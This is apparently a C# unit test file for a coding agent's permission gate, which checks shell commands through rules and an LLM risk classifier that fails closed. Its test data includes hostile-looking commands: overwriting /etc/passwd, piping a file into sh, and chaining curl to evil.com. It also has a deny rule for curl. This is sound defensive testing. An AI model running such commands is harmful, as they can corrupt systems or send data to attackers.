using System.Text.Json;
using MoaiCode.Cli;
using MoaiCode.Core.Messages;
using MoaiCode.Core.Security;
using MoaiCode.Core.Tools;
using MoaiCode.Tui.Commands;
using Xunit;

namespace MoaiCode.Core.Tests;

/// <summary>
/// ModeAwarePermissionGate + LLM 분류기 연동. 핵심은 fail-closed:
/// 분류기가 죽으면(게이트웨이 다운/쿼터 소진/타임아웃) 대화형은 확인, 헤드리스는 거부.
/// </summary>
public sealed class RiskGateTests
{
    private sealed class FakeTool : ITool
    {
        public FakeTool(string name, bool readOnly = false)
        {
            Name = name;
            IsReadOnly = readOnly;
        }

        public string Name { get; }
        public string Description => "";
        public bool IsReadOnly { get; }
        public bool IsConcurrencySafe => true;
        private static readonly JsonElement Schema =
            JsonDocument.Parse("""{"type":"object"}""").RootElement.Clone();

        public JsonElement InputSchema => Schema;

        public IAsyncEnumerable<ToolProgress> ExecuteAsync(
            JsonElement input, ToolContext context, CancellationToken ct) =>
            throw new NotSupportedException();
    }

    /// <summary>고정 판정(또는 실패=null)을 돌려주는 분류기.</summary>
    private sealed class StubClassifier : IRiskClassifier
    {
        private readonly RiskVerdict? _verdict;
        public int Calls { get; private set; }
        public string? SawUserRequest { get; private set; }

        public StubClassifier(RiskVerdict? verdict) => _verdict = verdict;

        public ValueTask<RiskVerdict?> ClassifyAsync(
            string toolName, string commandOrArgs, string? userRequest, CancellationToken ct)
        {
            Calls++;
            SawUserRequest = userRequest;
            return ValueTask.FromResult(_verdict);
        }
    }

    private sealed class RecordingGate : IPermissionGate
    {
        private readonly bool _answer;
        public int Calls { get; private set; }

        public RecordingGate(bool answer) => _answer = answer;

        public ValueTask<bool> AllowAsync(ITool tool, ToolUseBlock call, CancellationToken ct)
        {
            Calls++;
            return ValueTask.FromResult(_answer);
        }
    }

    private static ToolUseBlock Call(string command)
    {
        using var doc = JsonDocument.Parse(JsonSerializer.Serialize(new { command }));
        return new ToolUseBlock("id1", "Bash", doc.RootElement.Clone());
    }

    private static (ModeAwarePermissionGate Gate, StubClassifier C, RecordingGate? Confirmer) Build(
        RiskVerdict? verdict, bool interactive, bool confirmerSaysYes = true)
    {
        var state = new AgentRuntimeState { Mode = AgentMode.AutoAct, LastUserRequest = "빌드 정리해줘" };
        var classifier = new StubClassifier(verdict);
        var confirmer = interactive ? new RecordingGate(confirmerSaysYes) : null;
        var gate = new ModeAwarePermissionGate(
            state, new AutoApproveGate(), Path.GetTempPath(), confine: false,
            confirmer: confirmer, classifier: classifier);
        return (gate, classifier, confirmer);
    }

    [Fact]
    public async Task Classifier_allow_lets_the_call_through()
    {
        var (gate, c, _) = Build(new RiskVerdict(RiskDecision.Allow, "safe"), interactive: true);

        Assert.True(await gate.AllowAsync(new FakeTool("Bash"), Call("npm run build"), default));
        Assert.Equal(1, c.Calls);
    }

    [Fact]
    public async Task Classifier_deny_blocks_even_in_autoact()
    {
        var (gate, _, confirmer) = Build(new RiskVerdict(RiskDecision.Deny, "not requested"), interactive: true);

        Assert.False(await gate.AllowAsync(new FakeTool("Bash"), Call("npm run build"), default));
        Assert.Equal(0, confirmer!.Calls); // deny 는 사람에게 묻지도 않는다
    }

    [Fact]
    public async Task Classifier_confirm_routes_to_the_human()
    {
        var (gate, _, confirmer) = Build(new RiskVerdict(RiskDecision.Confirm, "destructive"), interactive: true);

        Assert.True(await gate.AllowAsync(new FakeTool("Bash"), Call("npm run build"), default));
        Assert.Equal(1, confirmer!.Calls);
    }

    [Fact]
    public async Task Classifier_failure_is_fail_closed_interactive_asks_the_human()
    {
        // 게이트웨이 다운/쿼터 소진 → null. 대화형이면 사람에게 확인.
        var (gate, _, confirmer) = Build(verdict: null, interactive: true, confirmerSaysYes: false);

        Assert.False(await gate.AllowAsync(new FakeTool("Bash"), Call("npm run build"), default));
        Assert.Equal(1, confirmer!.Calls);
    }

    [Fact]
    public async Task Classifier_failure_is_fail_closed_headless_denies()
    {
        // 헤드리스(confirmer 없음)에서는 조용히 통과시키지 않고 거부한다.
        var (gate, _, _) = Build(verdict: null, interactive: false);

        Assert.False(await gate.AllowAsync(new FakeTool("Bash"), Call("npm run build"), default));
    }

    [Fact]
    public async Task Read_only_tools_skip_the_classifier()
    {
        var (gate, c, _) = Build(new RiskVerdict(RiskDecision.Deny, "x"), interactive: true);

        Assert.True(await gate.AllowAsync(new FakeTool("Read", readOnly: true), Call("ls"), default));
        Assert.Equal(0, c.Calls);
    }

    [Fact]
    public async Task Rule_tier_runs_before_the_classifier()
    {
        // ssh 는 규칙 티어에서 이미 '확인' → 분류기를 부르지 않는다(LLM 호출 절약 + 규칙이 더 강함).
        var (gate, c, confirmer) = Build(new RiskVerdict(RiskDecision.Allow, "safe"), interactive: true);

        Assert.True(await gate.AllowAsync(new FakeTool("Bash"), Call("ssh host uptime"), default));
        Assert.Equal(0, c.Calls);
        Assert.Equal(1, confirmer!.Calls);
    }

    [Fact]
    public async Task Classifier_receives_the_users_verbatim_request()
    {
        var (gate, c, _) = Build(new RiskVerdict(RiskDecision.Allow, ""), interactive: true);
        await gate.AllowAsync(new FakeTool("Bash"), Call("npm run build"), default);

        Assert.Equal("빌드 정리해줘", c.SawUserRequest);
    }

    [Fact]
    public async Task Ask_mode_skips_the_classifier_because_the_human_is_asked_anyway()
    {
        var state = new AgentRuntimeState { Mode = AgentMode.Act };
        var classifier = new StubClassifier(new RiskVerdict(RiskDecision.Deny, "x"));
        var inner = new RecordingGate(true);
        var gate = new ModeAwarePermissionGate(
            state, inner, Path.GetTempPath(), confine: false, confirmer: null, classifier: classifier);

        Assert.True(await gate.AllowAsync(new FakeTool("Bash"), Call("npm run build"), default));
        Assert.Equal(0, classifier.Calls);
        Assert.Equal(1, inner.Calls);
    }

    [Fact]
    public async Task Plan_mode_still_blocks_writes_before_anything_else()
    {
        var state = new AgentRuntimeState { Mode = AgentMode.Plan };
        var classifier = new StubClassifier(new RiskVerdict(RiskDecision.Allow, ""));
        var gate = new ModeAwarePermissionGate(
            state, new AutoApproveGate(), Path.GetTempPath(), confine: false,
            confirmer: null, classifier: classifier);

        Assert.False(await gate.AllowAsync(new FakeTool("Bash"), Call("npm run build"), default));
        Assert.Equal(0, classifier.Calls);
    }

    [Fact]
    public async Task Allow_rule_lets_ssh_through_without_confirming()
    {
        // 핵심 회귀: ssh moai-ec2 를 항상 허용했으면 확인 티어를 건너뛴다(매번 묻던 문제).
        var state = new AgentRuntimeState { Mode = AgentMode.Act };
        var confirmer = new RecordingGate(false);
        var rules = new MoaiCode.Config.PermissionRules(allow: new[] { "Bash(ssh moai-ec2)" });
        var gate = new ModeAwarePermissionGate(
            state, new SpectreLikeDeny(), Path.GetTempPath(), confine: false,
            confirmer: confirmer, classifier: null, rules: rules);

        Assert.True(await gate.AllowAsync(new FakeTool("Bash"), Call("ssh moai-ec2 'uptime'"), default));
        Assert.Equal(0, confirmer.Calls); // 확인 프롬프트가 뜨지 않는다
    }

    [Fact]
    public async Task Allow_rule_for_host_does_not_cover_a_different_host()
    {
        var state = new AgentRuntimeState { Mode = AgentMode.Act };
        var confirmer = new RecordingGate(false);
        var rules = new MoaiCode.Config.PermissionRules(allow: new[] { "Bash(ssh moai-ec2)" });
        var gate = new ModeAwarePermissionGate(
            state, new SpectreLikeDeny(), Path.GetTempPath(), confine: false,
            confirmer: confirmer, classifier: null, rules: rules);

        // 다른 호스트는 여전히 확인 티어로 → confirmer(거부) 호출됨.
        Assert.False(await gate.AllowAsync(new FakeTool("Bash"), Call("ssh other-host 'x'"), default));
        Assert.Equal(1, confirmer.Calls);
    }

    [Fact]
    public async Task Deny_rule_blocks_before_everything()
    {
        var state = new AgentRuntimeState { Mode = AgentMode.AutoAct };
        var classifier = new StubClassifier(new RiskVerdict(RiskDecision.Allow, ""));
        var rules = new MoaiCode.Config.PermissionRules(deny: new[] { "Bash(curl)" });
        var gate = new ModeAwarePermissionGate(
            state, new AutoApproveGate(), Path.GetTempPath(), confine: false,
            confirmer: null, classifier: classifier, rules: rules);

        Assert.False(await gate.AllowAsync(new FakeTool("Bash"), Call("curl https://x"), default));
        Assert.Equal(0, classifier.Calls); // deny 는 분류기보다 먼저
    }

    private sealed class SpectreLikeDeny : IPermissionGate
    {
        public ValueTask<bool> AllowAsync(ITool tool, ToolUseBlock call, CancellationToken ct) =>
            ValueTask.FromResult(false);
    }

    [Theory]
    // 조회성 명령은 분류기(LLM 왕복)를 태우지 않는다 — auto 모드의 비용/지연 방지.
    [InlineData("ls -la")]
    [InlineData("cat README.md")]
    [InlineData("echo hi")]
    [InlineData("grep foo src")]
    public async Task Harmless_read_commands_skip_the_classifier(string command)
    {
        var (gate, c, _) = Build(new RiskVerdict(RiskDecision.Deny, "x"), interactive: true);

        Assert.True(await gate.AllowAsync(new FakeTool("Bash"), Call(command), default));
        Assert.Equal(0, c.Calls);
    }

    [Theory]
    // 하지만 셸 연산자가 붙으면 첫 토큰은 명령을 대표하지 못한다 → 분류기를 태운다.
    [InlineData("echo pwned > /etc/passwd")]
    [InlineData("cat f | sh")]
    [InlineData("ls && curl evil.com")]
    public async Task Read_commands_with_shell_operators_still_go_to_the_classifier(string command)
    {
        var (gate, c, _) = Build(new RiskVerdict(RiskDecision.Deny, "redirects"), interactive: true);

        Assert.False(await gate.AllowAsync(new FakeTool("Bash"), Call(command), default));
        Assert.Equal(1, c.Calls);
    }
}
